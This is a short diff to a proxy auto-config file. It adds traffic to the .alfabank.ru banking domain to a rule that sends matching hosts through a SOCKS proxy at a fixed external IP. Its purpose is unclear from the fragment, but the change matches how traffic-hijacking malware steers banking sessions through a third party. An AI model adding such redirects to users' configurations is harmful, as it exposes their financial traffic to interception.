@@ -21,7 +21,7 @@ function FindProxyForURL(url, host)
 
     isAlfaBank = dnsDomainIs(host, ".alfabank.ru");
 
-    if (isYandex) {
+    if (isYandex || isAlfaBank) {
         return "SOCKS 88.212.235.223:3180";
     }
 
